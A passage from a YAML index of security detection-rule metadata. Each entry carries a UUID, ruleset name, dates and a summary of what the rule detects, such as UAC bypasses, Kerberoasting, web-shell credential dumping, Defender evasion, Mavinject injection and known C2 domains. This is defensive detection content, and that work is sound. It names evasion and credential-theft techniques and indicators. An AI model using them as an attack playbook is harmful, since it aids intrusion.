    a Linux process using the "dd" Linux command.
  Updated-Date: '2024_09_04'
4cbd4f12-2e22-43e3-882f-bff3247ffb78:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d198fb63daadf88e6ed15e7abd0e51c
  Ruleset: sigmahq
  Summary: This rule detects the usage of the Get-Clipboard command in PowerShell
    logs, which may indicate an adversary capturing clipboard contents.
  Updated-Date: '2024_09_04'
4cbef972-f347-4170-b62a-8253f6168e6d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4e74daa0048645edbc46ec568078ec5f
  Ruleset: core
  Summary: This rule detects a UAC (User Account Control) bypass technique using the
    "IDiagnosticProfileUAC" method. Specifically, it identifies instances where the
    'DllHost.exe' process is executed with a particular command line parameter '/Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}'
    and maintains a high or system integrity level. This technique is used to elevate
    privileges, bypass security measures, and execute code with elevated permissions
    on Windows systems by exploiting the IDiagnosticProfile feature.
  Updated-Date: '2024_09_03'
4d0083b3-580b-40da-9bba-626c19fe4033:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: def60939a87217f16eadab238c9803eb
  Ruleset: core
  Summary: This rule detects the creation of named pipes with a specific pattern associated
    with the hack tool CoercedPotato. CoercedPotato is known for its use in defense
    evasion and privilege escalation techniques. The detection focuses on pipe names
    containing the string "\coerced\" and requires specific logging configurations
    in Sysmon to capture these events.
  Updated-Date: '2024_09_03'
4d07b1f4-cb00-4470-b9f8-b0191d48ff52:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 085f4f5e9cdb33cbb18a6435ed8823b8
  Ruleset: sigmahq
  Summary: This rule detects DNS queries to domains associated with remote access
    software originating from non-browser applications. Adversaries may exploit legitimate
    remote access tools like TeamViewer, Go2Assist, LogMeIn, and AmmyyAdmin to establish
    command and control channels within target systems. These tools are typically
    used for legitimate technical support purposes and may be permitted by application
    controls in certain environments. The detection scope includes various DNS queries
    such as those ending in domains commonly associated with remote desktop tools
    and excludes legitimate browser-related activity to minimize false positives.
  Updated-Date: '2024_09_04'
4d0af518-828e-4a04-a751-a7d03f3046ad:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ff42be746aa1d3988ac88c6a8fb4f411
  Ruleset: core
  Summary: This rule detects potential OGNL Injection exploitation in JVM-based applications,
    which can lead to Remote Code Execution (RCE). OGNL (Object-Graph Navigation Language)
    is an expression language used in various JVM systems. Notable vulnerabilities
    such as CVE-2017-5638 in Apache Struts and CVE-2022-26134 in Confluence have resulted
    from OGNL Injection. The detection relies on identifying specific keywords like
    'org.apache.commons.ognl.OgnlException' and 'ExpressionSyntaxException' in application
    error logs.
  Updated-Date: '2024_09_03'
4d16c9a6-4362-4863-9940-1dee35f1d70f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 57f6f7bf43a3522171cc7f8f98fe16e9
  Ruleset: emerging-threats
  Summary: This rule detects DNS queries for command and control (C2) domains associated
    with DPRK threat actors. It identifies specific domain names ('connection.lockscreen.kro.kr'
    and 'updating.dothome.co.kr') that are known to be used for malicious C2 communication.
    Monitoring these queries within a Windows environment can help in early detection
    of cyber threats linked to North Korean actors.
  Updated-Date: '2024_09_03'
4d431012-2ab5-4db7-a84e-b29809da2172:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1de73f7325ced81c59d7cc87c5bf407
  Ruleset: sigmahq
  Summary: This rule detects the enabling of the "AllowAnonymousCallback" registry
    value, which permits remote connections between computers that do not have an
    established trust relationship. The detection is configured to monitor changes
    to the registry key specific to Microsoft's Windows Management Instrumentation
    (WMI) and aims to identify any instances where this setting is altered, as it
    may indicate an attempt to evade security defenses by enabling remote access without
    proper authentication.
  Updated-Date: '2024_09_04'
4d78a000-ab52-4564-88a5-7ab5242b20c7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e278e357dd2d44c736ab9c98a523f495
  Ruleset: sigmahq
  Summary: This rule detects changes to the authentication method in Azure audit logs,
    which could indicate that an attacker is adding an authentication method to an
    account to maintain continued access. It monitors when security information related
    to user authentication methods is registered, classified under user management
    operations.
  Updated-Date: '2024_09_04'
4d7cda18-1b12-4e52-b45c-d28653210df8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dc048df76c1c648bd7b606907ab2d321
  Ruleset: core
  Summary: This rule detects the possible unloading of the Sysmon filter driver via
    the use of the fltmc.exe utility. The detection criteria include identifying instances
    where the fltMC.exe executable is used with a command line that contains both
    'unload' and 'sysmon'. Such activity indicates an attempt to disable Sysmon, a
    system monitoring tool, through the Windows Filter Manager Control utility, which
    could be part of an adversary's effort to evade defenses.
  Updated-Date: '2024_09_03'
4d7f1827-1637-4def-8d8a-fd254f9454df:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08afaa77c46c6be5570610307d973a3a
  Ruleset: core
  Summary: This rule detects the occurrence of application popups indicating a failure
    in the Sysmon service, specifically flagged as errors for either sysmon64.exe
    or sysmon.exe, identified by EventID 26 in the Application Popup provider. This
    could be indicative of a defense evasion tactic categorized under attack techniques.
  Updated-Date: '2024_09_03'
4d9f2ee2-c903-48ab-b9c1-8c0f474913d0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8ecec1b52c77455d8f82ad03f5135a5e
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions of storage buckets in Google
    Cloud. Specific method names monitored include `storage.buckets.delete`, `storage.buckets.insert`,
    `storage.buckets.update`, and `storage.buckets.patch`. Changes may be legitimate
    if performed by a system administrator, but actions by unfamiliar users should
    be investigated.
  Updated-Date: '2024_09_04'
4db60cc0-36fb-42b7-9b58-a5b53019fb74:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 547bc1a783efb71bc634cb5128221565
  Ruleset: sigmahq
  Summary: This rule detects any actions taken to disable, delete, or update an AWS
    CloudTrail trail by monitoring for specific events such as StopLogging, UpdateTrail,
    and DeleteTrail originating from cloudtrail.amazonaws.com. These activities can
    indicate attempts at defense evasion.
  Updated-Date: '2024_09_04'
4e19528a-f081-40dd-be09-90c39352bd64:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 330531620bb66a77a8a32ed171dd428a
  Ruleset: emerging-threats
  Summary: This rule detects the potential execution of the PowerShell script known
    as POWERTRASH, which may be associated with malicious activities. Indicators of
    this script include specific code patterns and functions such as `IO.Compression.DeflateStream`,
    `IO.MemoryStream`, `::FromBase64String`, `GetDelegateForFunctionPointer`, and
    `.Invoke()`. These patterns suggest the presence of complex manipulation and execution
    typically associated with sophisticated malware like FIN7, which targets systems
    including Veeam servers. The detection is designed for Windows environments using
    PowerShell script categories.
  Updated-Date: '2024_09_03'
4e25af4b-246d-44ea-8563-e42aacab006b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c943991b3fa7c4915ee200903639ab9
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "xterm" terminal emulator as a potential
    indicator of a reverse shell tunnel on Linux systems. It specifically looks for
    the presence of "xterm" in the process creation logs, combined with command-line
    parameters that include the "-display" option and end with ":1". This pattern
    can be indicative of unauthorized access or remote control attempts, as detailed
    in reverse shell cheat sheets and resources from cybersecurity references.
  Updated-Date: '2024_09_04'
4e2ed651-1906-4a59-a78a-18220fca1b22:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 23572adcb04fa9cec1a90132b9ed6ef0
  Ruleset: sigmahq
  Summary: This rule detects the execution of the NirCmd tool, which is often employed
    for command execution. NirCmd, a small command-line utility, can perform various
    system-related tasks such as running processes, setting volume levels, or creating
    shortcuts. The detection focuses on specific command line patterns associated
    with NirCmd's execution capabilities, such as "execmd," ".exe script," and "runinteractive."
    While NirCmd can be used for legitimate administrative purposes, its usage can
    also indicate potential unauthorized or malicious activity.
  Updated-Date: '2024_09_04'
4e64668a-4da1-49f5-a8df-9e2d5b866718:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ec25d34f6bddc829206f2f10134f5884
  Ruleset: emerging-threats
  Summary: This rule detects events of driver load errors in Windows print service
    logs that could indicate successful exploitation attempts of the print spooler
    vulnerability CVE-2021-1675, commonly known as "PrintNightmare." It focuses on
    specific error codes and keywords found in these logs, including various default
    file names used in proof-of-concept (PoC) codes. Potential false positives may
    include issues related to printer drivers.
  Updated-Date: '2024_09_03'
4e7050dd-e548-483f-b7d6-527ab4fa784d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fe30af51c08aec7df3b25753face8b25
  Ruleset: core
  Summary: This rule detects the creation of a file named "ntds.dit," which is the
    Active Directory Database, by an uncommon parent process or directory. The rule
    triggers when the file is created by processes such as "cscript.exe," "httpd.exe,"
    "nginx.exe," "php-cgi.exe," "powershell.exe," "pwsh.exe," "w3wp.exe," and "wscript.exe,"
    or from directories like "\apache," "\tomcat," "\AppData," "\Temp," "\Public,"
    and "\PerfLogs." It aims to identify potential unauthorized access or credential
    dumping activities targeting the Active Directory Database.
  Updated-Date: '2024_09_03'
4e762605-34a8-406d-b72e-c1a089313320:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 828e61777f5dd680398874bca3209fe7
  Ruleset: sigmahq
  Summary: This rule detects potential fake instances of HxTsr.exe being executed.
    HxTsr.exe is a legitimate Microsoft executable associated with Microsoft Outlook
    Communications and is normally located in a hidden "WindowsApps" subfolder within
    "C:\Program Files." Any instances of HxTsr.exe found outside of this specific
    directory might indicate the presence of malware disguising itself as the legitimate
    Outlook application component. The detection mechanism ensures that only unauthorized
    instances of HxTsr.exe, not in the expected directory, are flagged for further
    investigation.
  Updated-Date: '2024_09_04'
4e87b8e2-2ee9-4b2a-a715-4727d297ece0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4673146ee7b647f242039f59c30ba19e
  Ruleset: core
  Summary: This rule detects the creation of files that resemble exports of the local
    Security Account Manager (SAM) database on Windows systems. The SAM database contains
    user credentials and other sensitive information. Indications of such activity
    include the presence of certain file names and extensions in various directories,
    such as `Temp\sam`, `sam.sav`, `sam.hive`, and `sam.export`. These files can be
    associated with tools and exploits used to extract or manipulate SAM data, such
    as those referenced in vulnerabilities like CVE-2021-36934, and tools like ShadowSteal
    and hivenightmare. The detection aims to identify potential unauthorized access
    or misuse of SAM data, which could indicate an attempt to compromise user credentials.
  Updated-Date: '2024_09_03'
4ebc877f-4612-45cb-b3a5-8e3834db36c9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: df729279370f7c533235323680aab9ac
  Ruleset: core
  Summary: This rule detects parent-child process patterns indicative of web shell
    usage for credential dumping or exfiltration on a compromised Windows system.
    It identifies parent processes typically associated with web servers, such as
    `caddy.exe`, `httpd.exe`, `nginx.exe`, `php-cgi.exe`, `w3wp.exe`, and `ws_tomcatservice.exe`,
    or characterized by specific attributes in Tomcat processes like `java.exe` and
    `javaw.exe` running Tomcat flags or configurations. The rule also monitors suspicious
    child processes executing commands related to process dumping (e.g., using `rundll32`
    with `comsvcs`), file exfiltration (e.g., using WinRAR with specific flags), system
    user manipulation (e.g., using `net user` to add users), administrative group
    changes (e.g., using `net localgroup administrators`), execution of credential
    stealing tools (e.g., `ntdsutil.exe`, `ldifde.exe`, `adfind.exe`, `procdump.exe`,
    `Nanodump.exe`), and file or system disruption actions (e.g., `vssadmin.exe`,
    `fsutil.exe`). Additional suspicious command patterns include various encoded
    or hidden PowerShell commands, commands linked to `certutil`, `Rubeus`, `Mimikatz`,
    PowerShell download operations, WMIC process creation, registry operations, and
    process privilege queries.
  Updated-Date: '2024_09_03'
4eddc365-79b4-43ff-a9d7-99422dc34b93:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19113ad71a4abd61a7e4a1278c2ebd3d
  Ruleset: sigmahq
  Summary: This rule detects the use of Remote.exe, a component of WinDbg in the Windows
    SDK, which can be leveraged for application whitelisting (AWL) bypass and executing
    remote files.
  Updated-Date: '2024_09_04'
4ede543c-e098-43d9-a28f-dd784a13132f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dbb090bd28ef388dd9621336acb86ec7
  Ruleset: sigmahq
  Summary: This rule detects the execution of WinRAR in directories other than its
    default installation folders. It specifically monitors for instances of 'rar.exe'
    or 'winrar.exe' running outside the typical 'Program Files\WinRAR' paths. The
    rule excludes legitimate scenarios, such as the execution of UnRAR.exe or instances
    where installers temporarily use the TEMP directory. This anomaly could indicate
    potential misuse, possibly related to data compression for exfiltration purposes,
    aligning with tactics and techniques identified in cybersecurity frameworks.
  Updated-Date: '2024_09_04'
4edf51e1-cb83-4e1a-bc39-800e396068e3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5ba9e009cba3061da9c91d20a22160a4
  Ruleset: core
  Summary: This rule detects the obfuscated use of Clip.exe for executing PowerShell
    commands on a Windows system. Specifically, it identifies when the Clip.exe utility,
    which is typically used for clipboard operations, is manipulated to execute PowerShell
    scripts in an obfuscated manner. This activity is monitored by looking for specific
    patterns within Event ID 4697 that involve command-line scripts containing 'cmd',
    '&&', and 'clipboard]::'.
  Updated-Date: '2024_09_03'
4eec988f-7bf0-49f1-8675-1e6a510b3a2a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 65b9b8507939b901df207d22b49721b5
  Ruleset: sigmahq
  Summary: This rule detects changes to the "PendingFileRenameOperations" registry
    key, specifically targeting modifications originating from uncommon or suspicious
    image locations. These actions are indicative of attempts to stage files currently
    in use for renaming or deletion post-system reboot. Such manipulations often involve
    the use of "reg.exe" or "regedit.exe" from directories like '\AppData\Local\Temp\'
    or '\Users\Public\'. The rule helps identify potentially nefarious activity that
    may align with techniques used by malware such as PurpleFox, which abuses registry
    modifications for persistence and defense evasion.
  Updated-Date: '2024_09_04'
4f154fb6-27d1-4813-a759-78b93e0b9c48:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8f01ca39b01c85400ef2177a47232728
  Ruleset: core
  Summary: This rule detects instances where Cobalt Strike modules or commands, such
    as 'Invoke-UserHunter,' 'Invoke-ShareFinder,' 'Invoke-Kerberoast,' 'Invoke-SMBAutoBrute,'
    'Invoke-Nightmare,' 'zerologon,' and 'av_query' have been unintentionally entered
    into a CMD shell on Windows systems. Cobalt Strike is a legitimate penetration
    testing tool often used by attackers to control compromised systems, and the identified
    commands are typically used for various post-exploitation activities within a
    network. This detection aims to identify potential operator errors during the
    execution of these commands, which could indicate unauthorized or accidental usage.
  Updated-Date: '2024_09_03'
4f1707b1-b50b-45b4-b5a2-3978b5a5d0d6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b1761a323f9f1367f666ad0e67f5c635
  Ruleset: sigmahq
  Summary: "This rule detects the presence of Unicode characters in filenames that\
    \ are visually identical to ASCII characters, a technique known as a homoglyph\
    \ attack. These attacks leverage characters, particularly from the Cyrillic and\
    \ Greek alphabets, that appear indistinguishable from standard ASCII letters to\
    \ obfuscate and masquerade malicious files. By using \"perfect\" homoglyphs\u2014\
    characters that look exactly like their ASCII counterparts\u2014attackers can\
    \ trick users and systems into misidentifying harmful files, thus evading detection\
    \ mechanisms. The rule specifically targets filenames containing such homoglyphs\
    \ to identify potential security breaches, although it might need adjustments\
    \ in regions where these alphabets are natively used."
  Updated-Date: '2024_09_04'
4f2cd9b6-4a17-440f-bb2a-687abb65993a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e6f1882a049924b04c7a4886d2e563d
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Add-In deployment cache updating
    utility, AddInUtil.exe, with uncommon Addinroot or Pipelineroot paths. This might
    indicate an adversary attempting to execute AddInUtil.exe with paths that lead
    to their malicious Addins.Store payloads. The rule monitors specific command line
    arguments associated with AddInUtil.exe to identify unusual activity.
  Updated-Date: '2024_09_04'
4f573bb6-701a-4b8d-91db-87ae106e9a61:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3c5fbdef6f9b350cfc58f30d4f0750d
  Ruleset: emerging-threats
  Summary: This rule detects potential command and control (C2) communication related
    to the Goofy Guineapig backdoor. The detection focuses on specific user-agent
    strings and hostnames in proxy logs that match known indicators of this malware,
    which uses a distinctive combination of user-agent and server characteristics.
    The aim is to identify network traffic that may be indicative of backdoor activity
    associated with Goofy Guineapig, a type of malware.
  Updated-Date: '2024_09_03'
4f647cfa-b598-4e12-ad69-c68dd16caef8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cce7c2473ecc4b6adfeceaa5fdb9f4d6
  Ruleset: core
  Summary: This rule detects the use of the filename DumpStack.log to evade Microsoft
    Defender. It monitors process creation activities on Windows systems to identify
    instances where the filename DumpStack.log is used, as well as command lines containing
    the argument `-o DumpStack.log`. This technique is used by adversaries to bypass
    security mechanisms and avoid detection by Microsoft Defender.
  Updated-Date: '2024_09_03'
4f6c43e2-f989-4ea5-bcd8-843b49a0317c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bbfd3070be86ed771d4ff2f837426401
  Ruleset: core
  Summary: This rule detects the pattern of User Account Control (UAC) bypass using
    a WoW64 logger DLL hijack, specifically related to UACMe 30. It monitors process
    access activity on Windows systems, identifying instances where the source image
    path contains the SysWOW64 directory, granted access is set to '0x1fffff', and
    the call trace starts with the specified unknown pattern. This technique is typically
    employed for defense evasion and privilege escalation.
  Updated-Date: '2024_09_03'
4f73421b-5a0b-4bbf-a892-5a7fb99bea66:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bdf213062ee14b67e59293ba2dc9d7f
  Ruleset: core
  Summary: This rule detects process injection activities involving the use of the
    signed Windows tool "Mavinject" when executed with the "INJECTRUNNING" flag, indicating
    the tool is being utilized to inject a DLL into a running process. This behavior
    is monitored by examining process creation logs for specific command line patterns
    while excluding instances launched by the expected "AppVClient.exe" process. Mavinject,
    a legitimate Microsoft utility, can be exploited for malicious purposes to perform
    code injections, posing a significant risk to system security.
  Updated-Date: '2024_09_03'
4f77e1d7-3982-4ee0-8489-abf2d6b75284:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad75078508236d62d6fcc66f6c1b445e
  Ruleset: core
  Summary: This rule detects sign-ins from devices that are marked as non-compliant
    within Azure Sign-in logs. Non-compliant devices may pose security risks, and
    monitoring these sign-ins helps in identifying unauthorized access or potential
    security breaches.
  Updated-Date: '2024_09_03'
4f7a6757-ff79-46db-9687-66501a02d9ec:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6dc1658707de8f44a35b4999b5e4ba04
  Ruleset: sigmahq
  Summary: This rule detects the execution of "ldifde.exe" to export the organizational
    structure in an Active Directory environment. "Ldifde.exe" is a command-line utility
    used for importing and exporting data from Active Directory. The detection focuses
    on processes where the image or original file name matches "ldifde.exe" and the
    command line used contains the '-f' flag, indicating an export operation. It specifically
    filters out instances where the command line contains ' -i', which would signify
    an import operation instead.
  Updated-Date: '2024_09_04'
4f84b697-c9ed-4420-8ab5-e09af5b2345d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2e3136a3484064c0c97730d7a172bba
  Ruleset: sigmahq
  Summary: This rule detects the addition of new Dynamic Link Libraries (DLLs) to
    the AppInit_DLLs registry key path, specifically in the Windows NT CurrentVersion\Windows
    directory. The DLLs specified in these registry keys are loaded by the user32.dll
    into every process that initiates the user32.dll, potentially indicating an attempt
    at persistence by malicious software. The detection involves identifying any modifications
    to these registry keys and filtering out entries that are empty to reduce false
    positives. The rule primarily focuses on identifying unauthorized changes to ensure
    system integrity and detect potential malicious activities.
  Updated-Date: '2024_09_04'
4fc0deee-0057-4998-ab31-d24e46e0aba4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3809256a822076adfb8b57de55c299c
  Ruleset: sigmahq
  Summary: This rule detects the DLL sideloading of files typically found in system
    directories such as System32 and SysWOW64. DLL sideloading is a method used by
    attackers to load malicious DLL files in place of legitimate ones. By monitoring
    the loading of specific DLL files, such as aclui.dll, iphlpapi.dll, and windowscodecs.dll,
    in non-system locations, this rule aims to identify suspicious behavior associated
    with this technique. This can be indicative of malicious activities like privilege
    escalation, persistence, or defense evasion by various malware, including Qakbot
    and Dridex.
  Updated-Date: '2024_09_04'
4fcac6eb-0287-4090-8eea-2602e4c20040:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 135f0942cc296df0e1f2885900f80e9f
  Ruleset: emerging-threats
  Summary: This rule detects potential QBot activity by identifying specific process
    executions that have been used by QBot in the past. It monitors for instances
    where the `\WinRAR.exe` process spawns `\wscript.exe`, command lines that include
    the use of `ping.exe` with a specific delay tactic, and the execution of `regsvr32.exe`
    involving temporary files in the `C:\ProgramData` directory. These indicators
    are associated with QBot, a notorious banking trojan and malware downloader, known
    for its capability to steal passwords and banking information.
  Updated-Date: '2024_09_03'
4fdc44df-bfe9-4fcc-b041-68f5a2d3031c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d79bba3503a726217adcc9d9f9329d2a
  Ruleset: sigmahq
  Summary: "This rule detects instances of PowerShell script commands that are used\
    \ to manipulate local user accounts on Windows systems. It identifies actions\
    \ such as disabling, enabling, retrieving, setting, creating, renaming, or removing\
    \ local user accounts. These activities may indicate an adversary\u2019s attempt\
    \ to maintain persistent access by modifying account credentials or permission\
    \ groups. Script block logging must be enabled to capture these commands. Legitimate\
    \ administrative scripts may trigger this detection as well."
  Updated-Date: '2024_09_04'
4fe074b4-b833-4081-8f24-7dcfeca72b42:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa46d72d30989e07666acf38c8fd1077
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "findstr" command to search for
    common security tool names. Attackers may use "findstr" in conjunction with other
    reconnaissance commands like "tasklist" or "whoami" to filter results and identify
    security software running on the system. The rule focuses on specific keywords
    that an attacker might use to filter these results, such as "avira," "cylance,"
    "defender," "kaspersky," and "virus." The detection covers variations of these
    keywords to ensure comprehensive monitoring.
  Updated-Date: '2024_09_04'
4fe151c2-ecf9-4fae-95ae-b88ec9c2fca6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 24187ac03db147f295f782a071443312
  Ruleset: sigmahq
  Summary: This rule detects the installation of an Exchange Transport Agent on a
    Windows system. It identifies such activities by monitoring for the 'Install-TransportAgent'
    command within the Microsoft Exchange Management service. This process may be
    leveraged for persistence via manipulation of Microsoft Exchange Server or Outlook.
    Indicators such as the AssemblyPath can help differentiate between legitimate
    and malicious installations.
  Updated-Date: '2024_09_04'
4fe17521-aef3-4e6a-9d6b-4a7c8de155a8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 26e551b42d2dbec81b4e9d669692191d
  Ruleset: sigmahq
  Summary: This rule detects instances where a GIT service on an OpenCanary node has
    received a Git Clone request. OpenCanary is a tool used to create honeypots that
    can identify unauthorized activity by mimicking common services. The detection
    is triggered by logs with a specific log type identified as 16001. This activity
    is associated with potential unauthorized attempts to clone repositories from
    the GIT service, which can indicate efforts to collect or exfiltrate sensitive
    data.
  Updated-Date: '2024_09_04'
500b9d62-4bb8-43db-9e50-08438c3a3a07:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d6c730947e54510de15843966dc287f
  Ruleset: securityonion-resources
  Summary: This rule detects when a Git service on a Security Onion Intrusion Detection
    Honeypot (IDH) node receives a git clone request, which could indicate suspicious
    activities targeting the honeypot's Git repositories.
  Updated-Date: '2024_08_07'
503d581c-7df0-4bbe-b9be-5840c0ecc1fc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 50a2187a778f1e50e1f5b21c735b7f5c
  Ruleset: core
  Summary: This rule detects a User Account Control (UAC) bypass that utilizes both
    changepk.exe and slui.exe as part of a privilege escalation technique. The detection
    focuses on instances where changepk.exe is invoked with slui.exe as its parent
    process, both running with high or system integrity levels. This behavior is characteristic
    of the UACMe tool, specifically method 61, which is used to escalate privileges
    by circumventing standard UAC protections.
  Updated-Date: '2024_09_03'
503fe26e-b5f2-4944-a126-eab405cc06e5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bb2380dda0f32e298c9422f1ab752a4
  Ruleset: sigmahq
  Summary: This rule detects Kerberos Ticket Granting Service (TGS) requests using
    RC4-HMAC encryption, which may indicate a Kerberoasting attack. Kerberoasting
    is a technique used by attackers to extract service tickets for brute-forcing,
    potentially obtaining service account credentials. The rule specifically filters
    out TGS requests originating from computer accounts to reduce false positives
    from normal enterprise Service Principal Name (SPN) request activities. Detecting
    such requests can help identify and mitigate credential-access attempts within
    a network.
  Updated-Date: '2024_09_04'
504d63cb-0dba-4d02-8531-e72981aace2c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 92997f4b3736f4a1391d53ca14301587
  Ruleset: sigmahq
  Summary: This rule detects the use of the `X509Enrollment.CBinaryConverter` and
    the GUID `884e2002-217d-11da-b2a4-000e7bbb2b09` within PowerShell scripts. Such
    usage can be indicative of attempts to abuse the X509Enrollment class for purposes
    related to defense evasion. The presence of these elements in a script may point
    to malicious activity or misuse of legitimate administrative tools.
  Updated-Date: '2024_09_04'
508a9374-ad52-4789-b568-fc358def2c65:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7ef831f40c311426b636f731341a7c59
  Ruleset: sigmahq
  Summary: This rule detects command line operations on shell history files on macOS
    systems. It targets processes that interact with files such as ".bash_history,"
    ".zsh_history," ".zhistory," ".history," ".sh_history," and "fish_history." These
    interactions are often associated with credential access techniques used by attackers.
    However, legitimate administrative activity or legitimate software that involves
    cleaning history files can also trigger this detection.
  Updated-Date: '2024_09_04'
50919691-7302-437f-8e10-1fe088afa145:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d41a3f77a7dc7c3b06f84cca6a0a7188
  Ruleset: sigmahq
  Summary: This rule detects the execution of "regsvr32.exe" when it attempts to register
    a DLL file with an uncommon file extension. It focuses on instances where "regsvr32.exe"
    runs without the common file extensions such as .ax, .cpl, .dll, or .ocx, as these
    deviations can indicate potentially malicious activity. The rule includes filters
    for some additional less common extensions like .ppl and .bav while excluding
    null or empty command lines to reduce false positives. This detection helps identify
    defense evasion and execution tactics employed by malicious actors on Windows
    systems.
  Updated-Date: '2024_09_04'
509e84b9-a71a-40e0-834f-05470369bd1e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5292e2f2679b11e3eab1f492b77a86d4
  Ruleset: core
  Summary: This rule detects changes to the default Remote Desktop Protocol (RDP)
    port on a Windows system. RDP is a common feature that allows users to log into
    a remote system with an interactive graphical user interface, referred to by Microsoft
    as Remote Desktop Services (RDS). Specifically, the rule monitors the registry
    path associated with the RDP port number and triggers an alert if the port number
    deviates from the default, which is 3389.
  Updated-Date: '2024_09_03'
50a3c7aa-ec29-44a4-92c1-fce229eef6fc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a125d1b89c977fce463cb4df19184cf2
  Ruleset: sigmahq
  Summary: This rule detects instances where a conditional access policy in Azure
    is updated by an actor who is not approved to make such changes. The detection
    focuses on monitoring audit logs for messages indicating an update to conditional
    access policies. Upon detection, it is recommended to review the modified properties
    and compare the old and new values to identify any unauthorized or suspicious
    modifications. Potential false positives can occur due to misconfigured role permissions,
    so verification of the user's identity, user agent, and hostname is necessary
    to ensure legitimacy.
  Updated-Date: '2024_09_04'
50cb47b8-2c33-4b23-a2e9-4600657d9746:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2ea83ad3eb795decc8562df8a91dc304
  Ruleset: core
  Summary: This rule detects the loading of diagcab packages from a remote path, which
    can be indicative of exploiting the DogWalk vulnerability. Diagcab packages are
    associated with Windows diagnostics and troubleshooting. The detection focuses
    on identifying instances where these packages are accessed or loaded from remote
    network paths. While there may be legitimate use cases, such as packages being
    hosted on authorized remote locations, this behavior warrants high suspicion and
    scrutiny due to its potential use in exploiting vulnerabilities.
  Updated-Date: '2024_09_03'
50d66fb0-03f8-4da0-8add-84e77d12a020:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b5888ade071f612bdb75ce21c6a63ae
  Ruleset: sigmahq
